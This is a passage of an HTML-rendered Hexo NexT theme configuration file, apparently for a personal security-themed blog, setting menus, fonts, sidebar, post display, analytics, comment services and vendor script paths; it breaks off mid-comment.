class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Site Information Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># Put your favicon.ico into `hexo-site/source/` directory.</span></div><div class="line"><span class="attr">favicon:</span> /favicon.ico</div><div class="line"></div><div class="line"><span class="comment"># Set default keywords (Use a comma to separate)</span></div><div class="line"><span class="attr">keywords:</span> <span class="string">"ZEROYU, SEC"</span></div><div class="line"></div><div class="line"><span class="comment"># Set rss to false to disable feed link.</span></div><div class="line"><span class="comment"># Leave rss as empty to use site's feed link.</span></div><div class="line"><span class="comment"># Set rss to specific value if you have burned your feed already.</span></div><div class="line"><span class="attr">rss:</span></div><div class="line"></div><div class="line"><span class="comment"># Specify the date when the site was setup</span></div><div class="line"><span class="comment">#since: 2015</span></div><div class="line"></div><div class="line"><span class="comment"># icon between year and author @Footer</span></div><div class="line"><span class="attr">authoricon:</span> heart</div><div class="line"></div><div class="line"><span class="comment"># Footer `powered-by` and `theme-info` copyright</span></div><div class="line"><span class="attr">copyright:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.</span></div><div class="line"><span class="comment"># See: https://support.google.com/webmasters/answer/139066</span></div><div class="line"><span class="comment"># Tips: Before you open this tag, remeber set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )</span></div><div class="line"><span class="attr">canonical:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.</span></div><div class="line"><span class="attr">seo:</span> <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Menu Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)</span></div><div class="line"><span class="attr">menu:</span></div><div class="line"><span class="attr">  home:</span> /</div><div class="line"><span class="attr">  categories:</span> /categories</div><div class="line"><span class="attr">  about:</span> /about</div><div class="line"><span class="attr">  archives:</span> /archives</div><div class="line"><span class="attr">  tags:</span> /tags</div><div class="line">  <span class="comment">#sitemap: /sitemap.xml</span></div><div class="line">  <span class="comment">#commonweal: /404.html</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Enable/Disable menu icons.</span></div><div class="line"><span class="comment"># Icon Mapping:</span></div><div class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></div><div class="line"><span class="comment">#   Key is the name of menu item and value is the name of FontAwsome icon. Key is case-senstive.</span></div><div class="line"><span class="comment">#   When an question mask icon presenting up means that the item has no mapping icon.</span></div><div class="line"><span class="attr">menu_icons:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line">  <span class="comment">#KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</span></div><div class="line"><span class="attr">  home:</span> home</div><div class="line"><span class="attr">  about:</span> user</div><div class="line"><span class="attr">  categories:</span> th</div><div class="line"><span class="attr">  schedule:</span> calendar</div><div class="line"><span class="attr">  tags:</span> tags</div><div class="line"><span class="attr">  archives:</span> archive</div><div class="line"><span class="attr">  sitemap:</span> sitemap</div><div class="line"><span class="attr">  commonweal:</span> heartbeat</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Scheme Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># Schemes</span></div><div class="line"><span class="comment">#scheme: Muse</span></div><div class="line"><span class="attr">scheme:</span> Mist</div><div class="line"><span class="comment">#scheme: Pisces</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Font Settings</span></div><div class="line"><span class="comment"># - Find fonts on Google Fonts (https://www.google.com/fonts)</span></div><div class="line"><span class="comment"># - All fonts set here will have the following styles:</span></div><div class="line"><span class="comment">#     light, light italic, normal, normal intalic, bold, bold italic</span></div><div class="line"><span class="comment"># - Be aware that setting too much fonts will cause site running slowly</span></div><div class="line"><span class="comment"># - Introduce in 5.0.1</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="attr">font:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"></div><div class="line">  <span class="comment"># Uri of fonts host. E.g. //fonts.googleapis.com (Default)</span></div><div class="line"><span class="attr">  host:</span></div><div class="line"></div><div class="line">  <span class="comment"># Global font settings used on &lt;body&gt; element.</span></div><div class="line"><span class="attr">  global:</span></div><div class="line">    <span class="comment"># external: true will load this font family from host.</span></div><div class="line"><span class="attr">    external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    family:</span> Lato</div><div class="line"></div><div class="line">  <span class="comment"># Font settings for Headlines (h1, h2, h3, h4, h5, h6)</span></div><div class="line">  <span class="comment"># Fallback to `global` font settings.</span></div><div class="line"><span class="attr">  headings:</span></div><div class="line"><span class="attr">    external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    family:</span></div><div class="line"></div><div class="line">  <span class="comment"># Font settings for posts</span></div><div class="line">  <span class="comment"># Fallback to `global` font settings.</span></div><div class="line"><span class="attr">  posts:</span></div><div class="line"><span class="attr">    external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    family:</span></div><div class="line"></div><div class="line">  <span class="comment"># Font settings for Logo</span></div><div class="line">  <span class="comment"># Fallback to `global` font settings.</span></div><div class="line">  <span class="comment"># The `size` option use `px` as unit</span></div><div class="line"><span class="attr">  logo:</span></div><div class="line"><span class="attr">    external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    family:</span></div><div class="line"><span class="attr">    size:</span></div><div class="line"></div><div class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></div><div class="line"><span class="attr">  codes:</span></div><div class="line"><span class="attr">    external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    family:</span></div><div class="line"><span class="attr">    size:</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Sidebar Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Social Links</span></div><div class="line"><span class="comment"># Key is the link label showing to end users.</span></div><div class="line"><span class="comment"># Value is the target link (E.g. GitHub: https://github.com/iissnan)</span></div><div class="line"><span class="comment">#social:</span></div><div class="line">  <span class="comment">#LinkLabel: Link</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Social Links Icons</span></div><div class="line"><span class="comment"># Icon Mapping:</span></div><div class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></div><div class="line"><span class="comment">#   Key is the name of the item and value is the name of FontAwsome icon. Key is case-senstive.</span></div><div class="line"><span class="comment">#   When an globe mask icon presenting up means that the item has no mapping icon.</span></div><div class="line"><span class="attr">social_icons:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line">  <span class="comment"># Icon Mappings.</span></div><div class="line">  <span class="comment"># KeyMapsToSocalItemKey: NameOfTheIconFromFontAwesome</span></div><div class="line"><span class="attr">  GitHub:</span> github</div><div class="line"><span class="attr">  Twitter:</span> twitter</div><div class="line"><span class="attr">  Weibo:</span> weibo</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Sidebar Avatar</span></div><div class="line"><span class="comment"># in theme directory(source/images): /images/avatar.jpg</span></div><div class="line"><span class="comment"># in site  directory(source/uploads): /uploads/avatar.jpg</span></div><div class="line"><span class="comment">#avatar:</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Table Of Contents in the Sidebar</span></div><div class="line"><span class="attr">toc:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"></div><div class="line">  <span class="comment"># Automatically add list number to toc.</span></div><div class="line"><span class="attr">  number:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Creative Commons 4.0 International License.</span></div><div class="line"><span class="comment"># http://creativecommons.org/</span></div><div class="line"><span class="comment"># Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span></div><div class="line"><span class="comment">#creative_commons: by-nc-sa</span></div><div class="line"><span class="comment">#creative_commons:</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="attr">sidebar:</span></div><div class="line">  <span class="comment"># Sidebar Position, available value: left | right</span></div><div class="line"><span class="attr">  position:</span> left</div><div class="line">  <span class="comment">#position: right</span></div><div class="line"></div><div class="line">  <span class="comment"># Sidebar Display, available value:</span></div><div class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></div><div class="line">  <span class="comment">#  - always  expand for all pages automatically</span></div><div class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></div><div class="line">  <span class="comment">#  - remove  Totally remove sidebar including sidebar toggler.</span></div><div class="line"><span class="attr">  display:</span> post</div><div class="line">  <span class="comment">#display: always</span></div><div class="line">  <span class="comment">#display: hide</span></div><div class="line">  <span class="comment">#display: remove</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Blogrolls</span></div><div class="line"><span class="comment">#links_title: Links</span></div><div class="line"><span class="comment">#links_layout: block</span></div><div class="line"><span class="comment">#links_layout: inline</span></div><div class="line"><span class="comment">#links:</span></div><div class="line">  <span class="comment">#Title: http://example.com/</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Post Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># Automatically scroll page to section which is under &lt;!-- more --&gt; mark.</span></div><div class="line"><span class="attr">scroll_to_more:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Automatically excerpt description in homepage as preamble text.</span></div><div class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Automatically Excerpt. Not recommand.</span></div><div class="line"><span class="comment"># Please use &lt;!-- more --&gt; in the post to control excerpt accurately.</span></div><div class="line"><span class="attr">auto_excerpt:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  length:</span> <span class="number">150</span></div><div class="line"></div><div class="line"><span class="comment"># Post meta display settings</span></div><div class="line"><span class="attr">post_meta:</span></div><div class="line"><span class="attr">  item_text:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  created_at:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  updated_at:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  categories:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Wechat Subscriber</span></div><div class="line"><span class="comment">#wechat_subscriber:</span></div><div class="line">  <span class="comment">#enabled: true</span></div><div class="line">  <span class="comment">#qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg</span></div><div class="line">  <span class="comment">#description: ex. subscribe to my blog by scanning my public wechat account</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Misc Theme Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># Custom Logo.</span></div><div class="line"><span class="comment"># !!Only available for Default Scheme currently.</span></div><div class="line"><span class="comment"># Options:</span></div><div class="line"><span class="comment">#   enabled: [true/false] - Replace with specific image</span></div><div class="line"><span class="comment">#   image: url-of-image   - Images's url</span></div><div class="line"><span class="attr">custom_logo:</span></div><div class="line"><span class="attr">  enabled:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  image:</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Code Highlight theme</span></div><div class="line"><span class="comment"># Available value:</span></div><div class="line"><span class="comment">#    normal | night | night eighties | night blue | night bright</span></div><div class="line"><span class="comment"># https://github.com/chriskempson/tomorrow-theme</span></div><div class="line"><span class="attr">highlight_theme:</span> normal</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"><span class="comment"># Third Party Services Settings</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># MathJax Support</span></div><div class="line"><span class="attr">mathjax:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  per_page:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  cdn:</span> //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</div><div class="line"></div><div class="line"><span class="comment">#local search</span></div><div class="line"><span class="attr">search:</span></div><div class="line"><span class="attr">  path:</span> search.xml</div><div class="line"><span class="attr">  field:</span> post</div><div class="line"><span class="attr">  format:</span> html</div><div class="line"><span class="attr">  limit:</span> <span class="number">10000</span></div><div class="line"></div><div class="line"><span class="comment"># Swiftype Search API Key</span></div><div class="line"><span class="comment">#swiftype_key: oUgCiUNA9jix_1j3uXpn</span></div><div class="line"></div><div class="line"><span class="comment"># Baidu Analytics ID</span></div><div class="line"><span class="attr">baidu_analytics:</span> </div><div class="line"></div><div class="line"><span class="comment"># Duoshuo ShortName</span></div><div class="line"><span class="attr">duoshuo_shortname:</span> </div><div class="line"></div><div class="line"><span class="comment"># Disqus</span></div><div class="line"><span class="comment">#disqus_shortname:</span></div><div class="line"></div><div class="line"><span class="comment"># Hypercomments</span></div><div class="line"><span class="comment">#hypercomments_id:</span></div><div class="line"></div><div class="line"><span class="comment"># Gentie productKey</span></div><div class="line"><span class="comment">#gentie_productKey:</span></div><div class="line"></div><div class="line"><span class="comment"># Support for youyan comments system.</span></div><div class="line"><span class="comment"># You can get your uid from http://www.uyan.cc</span></div><div class="line"><span class="comment">#youyan_uid: your uid</span></div><div class="line"></div><div class="line"><span class="comment"># Baidu Share</span></div><div class="line"><span class="comment"># Available value:</span></div><div class="line"><span class="comment">#    button | slide</span></div><div class="line"><span class="comment"># Warning: Baidu Share does not support https.</span></div><div class="line"><span class="comment">#baidushare:</span></div><div class="line"><span class="comment">##  type: button</span></div><div class="line"></div><div class="line"><span class="comment"># Share</span></div><div class="line"><span class="comment">#jiathis:</span></div><div class="line"><span class="comment"># Warning: JiaThis does not support https.</span></div><div class="line"><span class="comment">#add_this_id:</span></div><div class="line"></div><div class="line"><span class="comment"># Share</span></div><div class="line"><span class="comment">#duoshuo_share: true</span></div><div class="line"></div><div class="line"><span class="comment"># Google Webmaster tools verification setting</span></div><div class="line"><span class="comment"># See: https://www.google.com/webmasters/</span></div><div class="line"><span class="comment">#google_site_verification:</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Google Analytics</span></div><div class="line"><span class="comment">#google_analytics:</span></div><div class="line"></div><div class="line"><span class="comment"># CNZZ count</span></div><div class="line"><span class="comment">#cnzz_siteid:</span></div><div class="line"></div><div class="line"><span class="comment"># Application Insights</span></div><div class="line"><span class="comment"># See https://azure.microsoft.com/en-us/services/application-insights/</span></div><div class="line"><span class="comment"># application_insights:</span></div><div class="line"></div><div class="line"><span class="comment"># Make duoshuo show UA</span></div><div class="line"><span class="comment"># user_id must NOT be null when admin_enable is true!</span></div><div class="line"><span class="comment"># you can visit http://dev.duoshuo.com get duoshuo user id.</span></div><div class="line"><span class="attr">duoshuo_info:</span></div><div class="line"><span class="attr">  ua_enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  admin_enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  user_id:</span> <span class="number">0</span></div><div class="line">  <span class="comment">#admin_nickname: Author</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Facebook SDK Support.</span></div><div class="line"><span class="comment"># https://github.com/iissnan/hexo-theme-next/pull/410</span></div><div class="line"><span class="attr">facebook_sdk:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  app_id:</span>       <span class="comment">#&lt;app_id&gt;</span></div><div class="line"><span class="attr">  fb_admin:</span>     <span class="comment">#&lt;user_id&gt;</span></div><div class="line"><span class="attr">  like_button:</span>  <span class="comment">#true</span></div><div class="line"><span class="attr">  webmaster:</span>    <span class="comment">#true</span></div><div class="line"></div><div class="line"><span class="comment"># Facebook comments plugin</span></div><div class="line"><span class="comment"># This plugin depends on Facebook SDK.</span></div><div class="line"><span class="comment"># If facebook_sdk.enable is false, Facebook comments plugin is unavailable.</span></div><div class="line"><span class="attr">facebook_comments_plugin:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  num_of_posts:</span> <span class="number">10</span>  <span class="comment"># min posts num is 1</span></div><div class="line"><span class="attr">  width:</span> <span class="number">100</span>%       <span class="comment"># default width is 550px</span></div><div class="line"><span class="attr">  scheme:</span> light     <span class="comment"># default scheme is light (light or dark)</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Show number of visitors to each article.</span></div><div class="line"><span class="comment"># You can visit https://leancloud.cn get AppID and AppKey.</span></div><div class="line"><span class="attr">leancloud_visitors:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  app_id:</span>  <span class="comment">#&lt;app_id&gt;</span></div><div class="line"><span class="attr">  app_key:</span> <span class="comment">#&lt;app_key&gt;</span></div><div class="line"></div><div class="line"><span class="comment"># Show PV/UV of the website/page with busuanzi.</span></div><div class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi/</span></div><div class="line"><span class="attr">busuanzi_count:</span></div><div class="line">  <span class="comment"># count values only if the other configs are false</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line">  <span class="comment"># custom uv span for the whole site</span></div><div class="line"><span class="attr">  site_uv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_uv_header:</span> &lt;i class=<span class="string">"fa fa-user"</span>&gt;&lt;/i<span class="string">&gt;</span></div><div class="line"><span class="attr">  site_uv_footer:</span></div><div class="line">  <span class="comment"># custom pv span for the whole site</span></div><div class="line"><span class="attr">  site_pv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_pv_header:</span> &lt;i class=<span class="string">"fa fa-eye"</span>&gt;&lt;/i<span class="string">&gt;</span></div><div class="line"><span class="attr">  site_pv_footer:</span></div><div class="line">  <span class="comment"># custom pv span for one page only</span></div><div class="line"><span class="attr">  page_pv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  page_pv_header:</span> &lt;i class=<span class="string">"fa fa-file-o"</span>&gt;&lt;/i<span class="string">&gt;</span></div><div class="line"><span class="attr">  page_pv_footer:</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Tencent analytics ID</span></div><div class="line"><span class="comment"># tencent_analytics:</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span></div><div class="line"><span class="attr">baidu_push:</span> <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="comment"># Google Calendar</span></div><div class="line"><span class="comment"># Share your recent schedule to others via calendar page</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># API Documentation:</span></div><div class="line"><span class="comment"># https://developers.google.com/google-apps/calendar/v3/reference/events/list</span></div><div class="line"><span class="attr">calendar:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  calendar_id:</span> &lt;required<span class="string">&gt;</span></div><div class="line"><span class="attr">  api_key:</span> &lt;required<span class="string">&gt;</span></div><div class="line"><span class="attr">  orderBy:</span> startTime</div><div class="line"><span class="attr">  offsetMax:</span> <span class="number">24</span></div><div class="line"><span class="attr">  offsetMin:</span> <span class="number">4</span></div><div class="line"><span class="attr">  timeZone:</span></div><div class="line"><span class="attr">  showDeleted:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  singleEvents:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  maxResults:</span> <span class="number">250</span></div><div class="line"></div><div class="line"><span class="comment"># Algolia Search</span></div><div class="line"><span class="attr">algolia_search:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  hits:</span></div><div class="line"><span class="attr">    per_page:</span> <span class="number">10</span></div><div class="line"><span class="attr">  labels:</span></div><div class="line"><span class="attr">    input_placeholder:</span> Search for Posts</div><div class="line"><span class="attr">    hits_empty:</span> <span class="string">"We didn't find any results for the search: $&#123;query&#125;"</span></div><div class="line"><span class="attr">    hits_stats:</span> <span class="string">"$&#123;hits&#125; results found in $&#123;time&#125; ms"</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#! ---------------------------------------------------------------</span></div><div class="line"><span class="comment">#! DO NOT EDIT THE FOLLOWING SETTINGS</span></div><div class="line"><span class="comment">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span></div><div class="line"><span class="comment">#! ---------------------------------------------------------------</span></div><div class="line"></div><div class="line"><span class="comment"># Motion</span></div><div class="line"><span class="attr">use_motion:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Fancybox</span></div><div class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># Canvas-nest</span></div><div class="line"><span class="attr">canvas_nest:</span> <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="comment"># Script Vendors.</span></div><div class="line"><span class="comment"># Set a CDN address for the vendor you want to customize.</span></div><div class="line"><span class="comment"># For example</span></div><div class="line"><span class="comment">#    jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js</span></div><div class="line"><span class="comment"># Be aware that you should use the same version as internal ones to avoid potential problems.</span></div><div class="line"><span class="comment"># Please use the https protocol of CDN files when you enable https on your site.</span></div><div class="line"><span class="attr">vendors:</span></div><div class="line">  <span class="comment"># Internal path prefix. Please do not edit it.</span></div><div class="line"><span class="attr">  _internal:</span> lib</div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 2.1.3</span></div><div class="line"><span class="attr">  jquery:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 2.1.5</span></div><div class="line">  <span class="comment"># See: http://fancyapps.com/fancybox/</span></div><div class="line"><span class="attr">  fancybox:</span></div><div class="line"><span class="attr">  fancybox_css:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 1.0.6</span></div><div class="line">  <span class="comment"># See: https://github.com/ftlabs/fastclick</span></div><div class="line"><span class="attr">  fastclick:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 1.9.7</span></div><div class="line">  <span class="comment"># See: https://github.com/tuupola/jquery_lazyload</span></div><div class="line"><span class="attr">  lazyload:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 1.2.1</span></div><div class="line">  <span class="comment"># See: http://VelocityJS.org</span></div><div class="line"><span class="attr">  velocity:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 1.2.1</span></div><div class="line">  <span class="comment"># See: http://VelocityJS.org</span></div><div class="line"><span class="attr">  velocity_ui:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 0.7.9</span></div><div class="line">  <span class="comment"># See: 